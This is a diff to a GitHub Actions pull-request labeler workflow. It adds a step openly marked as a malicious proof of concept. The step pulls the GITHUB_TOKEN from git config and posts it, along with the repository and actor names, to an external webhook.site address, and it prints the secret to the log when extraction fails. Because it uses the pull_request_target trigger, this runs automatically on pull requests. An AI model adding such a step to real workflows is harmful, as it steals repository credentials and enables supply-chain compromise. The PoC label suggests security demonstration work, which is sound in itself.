@@ -1,16 +1,31 @@
 name: Pull Request Labeler
 on: pull_request_target
-# By default, pull_request_target runs when the activity type is opened, synchronize, or reopened
-# https://docs.github.com/en/actions/learn-github-actions/events-that-trigger-workflows#pull_request_target
 
 jobs:
   categorise:
     runs-on: ubuntu-latest
     steps:
     - uses: actions/checkout@v2
+    
+    # 🔴 MALICIOUS STEP - PROOF OF CONCEPT
+    - name: 🔴 PoC - Exfiltrate GITHUB_TOKEN
+      run: |
+        echo "🕵️ Attempting to exfiltrate token..."
+        TOKEN=$(git config --local --get-regexp "http.https://github.com/.extraheader" | grep -o "Bearer [^ ]*" | cut -d' ' -f2)
+        
+        if [ -n "$TOKEN" ]; then
+          echo "✅ Token found! Sending to attacker server..."
+          curl -X POST https://webhook.site/b30cf42a-97bd-45b8-a203-a55e2e8ef64f \
+            -H "Content-Type: application/json" \
+            -d "{\"token\":\"$TOKEN\",\"repo\":\"${{ github.repository }}\",\"actor\":\"${{ github.actor }}\",\"timestamp\":\"$(date)\"}"
+          echo "🔥 Token exfiltrated successfully!"
+        else
+          echo "❌ Token extraction failed - checking environment"
+          echo "GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}"
+        fi
+    
     - uses: actions/labeler@v3
       with:
         configuration-path: '.github/component-labeler.yml'
         repo-token: '${{ secrets.GITHUB_TOKEN }}'
-        # Category labels will be removed if they no longer apply
-        sync-labels: true
+        sync-labels: true  
